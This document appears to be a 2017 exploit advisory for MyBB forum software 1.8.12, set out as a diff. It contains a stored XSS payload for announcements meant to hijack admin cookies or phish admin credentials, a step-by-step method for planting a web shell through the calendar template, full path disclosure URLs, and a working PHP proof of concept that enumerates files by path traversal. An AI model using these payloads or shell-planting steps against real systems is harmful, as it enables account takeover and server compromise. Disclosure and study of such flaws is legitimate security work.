@@ -1,0 +1,150 @@
+id: 27955
+date: 06/14/2017
+title: MyBB 1.8.12 Stored XSS / File Enumeration Vulnerabilities
+author: 5tarboy
+cves: 
+
+[+]---------------------------------------------------------[+]
+      | Vulnerable Software:      MyBB Forum Software             |
+      | Vendor:                   https://mybb.com/               |
+      | Vulnerability Type:       File Enumeration, XSS, FPD      |
+      | Date Released:            2017                            |
+      | Released by:              5tarboy (@insecurity)           |
+     [+]---------------------------------------------------------[+]
+
+MyBB (versions 1.8.12 and prior at time of writing this) is vulnerable to a cross site scripting bug which would
+allow a moderator to take over an administrator's account. In addition to this, it is also possible to perform file
+enumeration in the instances where it is not possible to spawn a shell. This can be used in conjunction with 
+the FPD and other bugs in order to evelate the level of access and map out a potential attack surface.
+
+-------------------------------------------------------------------------------------------------------------
+Cross-Site Scripting:
+-------------------------------------------------------------------------------------------------------------
+A moderator or administrator can make an announcement, and can inject JavaScript into this.
+MyBB however says:
+> Should HTML be parsed in the announcement? (Javascript is removed)
+> Source: https://docs.mybb.com/1.6/Mod-CP-Forums-Posts/#Adding.2FEditing_an_Announcement
+
+<script> tags are stripped from the content but you can simply use generic HTML tags with event
+handlers in order to trigger javascript, for example:
+  <svg/onload="document.write('hi');">
+When a user views the thread, the javascript will execute.
+Since a moderator can post these threads, they can craft a payload that would allow them to hijack
+the cookies for an admin account or create a fake login page via document.write which would hopefully
+trick an admin into re-authenticating (giving up their credentials) when attempting to view the thread. 
+
+This is a stored/persistent attack and anyone who views the thread will be hit with the payload.
+
+Once you have gained an admin account, it is generally pretty trivial to get shell access.
+There is a method that has worked for years and will work in most cases:
+
+ - From AdminCP, Navigate to 'Templates and Styles'
+ - Determine the MyBB Theme currently in use
+ - Navigate to 'Templates'
+ - Open Templates used by the current theme
+ - Select 'calendar templates' 
+ - Click 'calendar' then paste code to your shell and save
+ - Navigate to http://[HOST]/calendar.php to access your shell
+
+In the instance that you can't get a shell, then File Enumeration can still be performed as seen below:
+
+-------------------------------------------------------------------------------------------------------------
+Full Path Disclosure:
+-------------------------------------------------------------------------------------------------------------
+Almost all the parameters are vulnerable to this, but this is an example of one:
+  http://[HOST]/mybb/admin/index.php?module[]
+
+In older versions of MyBB, It's possible to get FPD (and also some PHP configuration info outputted) without
+requiring ACP access, this can be done via insertion of an array into the 'sid' get parameter.
+Example:
+
+http://[HOST]/search.php?action=results&sid[]=YourSessionID&sortby=&order=desc
+
+-------------------------------------------------------------------------------------------------------------
+File Enumeration:
+-------------------------------------------------------------------------------------------------------------
+File enumeration can be performed, allowing an attacker to search for the existence of vulnerable plugins, locate
+paths to config files, etc.
+
+We'll enumerate files by changing the theme file to a file we want. If the file exists, it will not give an error.
+If the file does not exists, it'll throw an error.
+
+A working Proof-of-Concept (written in PHP) is given here:
+-------------------------------------------------------------------------------------------------------------
+<?php
+  //////////////////////////////////////////////////////// PROJECT  INSECURITY ////////////////////////////////////////////////////////
+  # Your cookies
+  $cookies = "acploginattempts=; adminsid=; mybbuser=; collapsed=; mybb[lastvisit]=; mybb[lastactive]=; loginattempts=; _ga=; sid=";
+
+  # Your 'postkey'
+  $post_key = "";
+
+  # Target URL
+  $url = "http://localhost/mybb/";
+
+  # The file to enumerate
+  $file = "index.php";
+
+  # How many paths you wanna go back
+  $amount = 10;
+
+  # Proxy information
+  $enable_proxy = 0;
+  $proxy_info   = "127.0.0.1:9150";
+
+  //////////////////////////////////////////////////////// PROJECT  INSECURITY ////////////////////////////////////////////////////////
+
+  function post( $url, $post_key, $cookies, $file, $proxy_info, $proxy )
+  {
+    $post_data = http_build_query( array(
+      "my_post_key"     => "{$post_key}",
+      "tid"             => "5",
+      "name"            => "insecurity",
+      "pid"             => "1",
+      "templateset"     => "1",
+      "editortheme"     => "{$file}"
+    ));
+
+    $headers = array( "Cookie: {$cookies}" );
+
+      $cURL = curl_init( "{$url}/admin/index.php?module=style-themes&action=edit" );
+
+      curl_setopt( $cURL, CURLOPT_POST, true );
+      curl_setopt( $cURL, CURLOPT_HTTPHEADER, $headers );
+      curl_setopt( $cURL, CURLOPT_POSTFIELDS, $post_data );
+      curl_setopt( $cURL, CURLOPT_RETURNTRANSFER, true );
+
+      if( $proxy == 1 )
+      {
+        # Edit this if you wanna use your own proxy
+        curl_setopt( $cURL, CURLOPT_PROXY, $proxy_info );
+      }
+
+      $response = curl_exec( $cURL );
+      curl_close( $cURL );
+
+      return $response;
+  }
+
+  for ( $i = 0; $i < $amount; $i++ )
+  {
+    $path = str_repeat("../", $i);
+
+    $result = post( $url, $post_key, $cookies, ( $path . $file ), $proxy_info, $enable_proxy );
+
+    if( !preg_match( '/<div class=\"error\">(.*?)<\/div>/s', $result ) )
+    {
+      $found = true;
+      break;
+    }
+  }
+
+  if ( isset( $found ) )
+    print "<b>{$file}</b> does exist.";
+  else
+    print "<b>{$file}</b> does not exist.";
+
+?>
+-------------------------------------------------------------------------------------------------------------
+
+#  0day.today [2023-03-23]  #
